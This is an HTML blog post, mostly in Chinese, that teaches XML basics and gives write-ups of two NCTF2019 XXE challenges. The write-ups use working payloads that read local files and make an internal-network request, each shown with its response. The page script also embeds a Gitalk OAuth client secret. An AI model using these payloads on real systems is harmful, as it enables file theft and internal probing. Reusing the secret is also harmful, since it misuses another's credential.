@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>The-XXe - Cupid&#39;s Blog</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="a new ctfer&#39;s study">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
+  <meta name="description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The-XXe">
+<meta property="og:url" content="http://yoursite.com/2019/11/26/The-XXe/index.html">
+<meta property="og:site_name" content="Cupid&#39;s Blog">
+<meta property="og:description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-11-26T15:23:00.247Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="The-XXe">
+<meta name="twitter:description" content="XXE1.What is the XXE?XXE(XML External Entity Injection)中文名为XML外部实体注入。要充分了解这个注入方式，得先了解XML的构造。">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1577797659794">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(http://img3.imgtn.bdimg.com/it/u=3748941237,546001350&amp;fm=26&amp;gp=0.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Cupid" class="mdui-btn mdui-btn-icon"><img src="/images/namei.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Cupid">
+            <img src="/images/namei.png" alt="Cupid">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>61</div>
+        <div><span>Tags</span>0</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Social</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://space.bilibili.com/20238211" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/nexmoe/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 Cupid
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="http://img3.imgtn.bdimg.com/it/u=3748941237,546001350&amp;fm=26&amp;gp=0.jpg">
+        
+        <h1>The-XXe</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月26日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.3k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
+    
+    
+  </div>
+  <article>
+    <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="1-What-is-the-XXE"><a href="#1-What-is-the-XXE" class="headerlink" title="1.What is the XXE?"></a>1.What is the XXE?</h2><p>XXE(XML External Entity Injection)中文名为XML外部实体注入。<br>要充分了解这个注入方式，得先了解XML的构造。<a id="more"></a></p>
+<h2 id="2-So-How-is-the-Xml-working"><a href="#2-So-How-is-the-Xml-working" class="headerlink" title="2.So,How is the Xml working?"></a>2.So,How is the Xml working?</h2><p>XML is a extend of HTML<br>it’s not a replacment of HTML,but it must be a extend of<br>HTML.<br>XML(Extensible Markup Language)<br>中文名:可扩展标记语言<br>它是一种标记语言，它的设计宗旨是传输数据，而并非显示数据，这也是与HTML的区别。<br>XML的标签没有被预定义，因此用户可以自行定义自己的特色标签，如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;note&gt;a easy write&lt;/note&gt;</span><br><span class="line">&lt;writeby&gt;Cupit&lt;/writeby&gt;</span><br><span class="line">&lt;to&gt;James&lt;/to&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML被设计具有自我描述性，它也是W3C的推荐标准<br>XML只是纯文本，有能力处理纯文本的软件都可以处理XML<br>通过XML，数据能够存储在独立的XML文件中，这样HTML可以专注的进行布局与显示。<br>通过JS代码，就可以读取一个外部XML文件，并用之更新HTML内的数据内容。</p>
+<h2 id="3-learn-about-the-structure-of-XML"><a href="#3-learn-about-the-structure-of-XML" class="headerlink" title="3.learn about the structure of XML"></a>3.learn about the structure of XML</h2><p>XML文档形成了一种树结构，从根部开始，然后扩展到枝叶<br>下面是一个XML文档的实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;note&gt;I LOVE you!&lt;note&gt;</span><br><span class="line">&lt;from&gt;Cupid&lt;/from&gt;</span><br><span class="line">&lt;to&gt;ZQ&lt;/to&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第一行是XML的声明，定义了其版本是1.0并且使用的编码是utf-8.<br>下一行是描述文档的根元素<br>接下来的几行是描述根的子元素(note,from,to)<br>XML文档必须包含根元素，是其余元素的父元素</p>
+<h2 id="4-the-XML’s-rule"><a href="#4-the-XML’s-rule" class="headerlink" title="4.the XML’s rule"></a>4.the XML’s rule</h2><p>all THE xml的元素都必须有关闭标签<br>XML标签对大小写敏感<br>比如<note>和<note>是不同的<br>当然也应该相对应的正确的关标签<br>XML必须正确地嵌套，XML文档必须包含根元素<br>XML的属性值必须加上引号，例如下列：</note></note></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;note data=&quot;2019/09/01&quot;&gt;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p>###4.1实体引用###<br>在XML中，很多字符具有特殊的意义，由此如果把字符例如”&lt;”放再XML中就会解析错误，解析器会把它当作新元素的开始，例如下面的写法就是错误的：<br><error>14&gt;10</error><br>当然可以避免这个错误，使用对应的实体引用来代替这个符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt 来代替&lt;</span><br><span class="line">&amp;gt 来代替&gt;</span><br><span class="line">&amp;amp 代替和号&amp;</span><br><span class="line">&amp;apos 代替 单引号</span><br><span class="line">&amp;quot 代替 引号 &quot;</span><br></pre></td></tr></table></figure>
+
+<p>在XML中符号“&lt;”和“&amp;”都是非法的，而大于号是合法的，但是用实体引用代替是一个好习惯</p>
+<p>###4.2XML中的注释###<br>XML中使用以下的方法来注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--this is a comment--&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-the-elements-of-XML"><a href="#5-the-elements-of-XML" class="headerlink" title="5.the elements of XML"></a>5.the elements of XML</h2><p>XML元素指从开始标签知道结束标签的部分，元素课包含其他文本，也可以包含元素，当然它也可以拥有属性<br>XML属性必须加引号：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;person sex=&quot;female&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-XML-DTD"><a href="#6-XML-DTD" class="headerlink" title="6.XML DTD"></a>6.XML DTD</h2><p>DTD的作用是定义XML文档的结构。它使用一系列合法的元素来定义文档结构。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE XXE[</span><br><span class="line">	&lt;!ELEMENT xxe(#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD(Document Type Definition)<br>中文名：文档类型定义<br>上面的例子是内部的DOCTYPE声明。</p>
+<p>###6.1外部文档声明###<br>如果DTD位于XML源文件的外部，那么它可以通过如下的语法封装在一个DOCTYPE定义中:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE’s-Example-in-CTF"><a href="#XXE’s-Example-in-CTF" class="headerlink" title="XXE’s Example in CTF"></a>XXE’s Example in CTF</h2><p>下面两道XXE的例题是NCTF2019的题，题目平台已经关闭，下面给出其writeup。<br>1.Fake XML cookbook<br>进入页面后是一个登陆框，抓包到BP中可以发现其用户信息是采用的XML元素来传递的，那么这种可以直接构造XXE语句获取flag.题目又给出了Hint:flag在/flag下<br>因而构造如下XXE语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE XXE[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;21412&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload构造成功后可以看到Response:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;NCTF&#123;W3lc0m3_T0_NCTF_9102&#125;&lt;/msg&gt;&lt;/result&gt;</span><br></pre></td></tr></table></figure>
+
+<p>拿下flag.</p>
+<p>2.True XML cookbook<br>进入页面后同样是登陆框，同理抓包。<br>构造payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE XXE[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///proc/net/arp&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;21412&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取/etc/hosts发现有个内网IP,读取/proc/net/arp发现有很多内网IP，一个个探测，最后得到正确的flag:IP<br>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE XXE[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.8&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">&lt;password&gt;21412&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到response的回应：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt;</span><br><span class="line">&lt;code&gt;0&lt;/code&gt;</span><br><span class="line">&lt;msg&gt;NCTF&#123;XXE-labs_is_g00d&#125;&lt;/msg&gt;</span><br><span class="line">&lt;/result&gt;</span><br></pre></td></tr></table></figure>
+
+<p>##结语##<br>最后附上学习链接：2019NCTF平台:<a href="https://nctf.x1c.club/" target="_blank" rel="noopener">https://nctf.x1c.club/</a>(现应该已关)<br>W3school:<a href="https://www.w3school.com.cn/dtd/dtd_intro.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/dtd/dtd_intro.asp</a></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>Author：</strong>Cupid<br>
+<strong>Link：</strong><a href="http://yoursite.com/2019/11/26/The-XXe/" title="http://yoursite.com/2019/11/26/The-XXe/" target="_blank" rel="noopener">http://yoursite.com/2019/11/26/The-XXe/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1577797659868"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
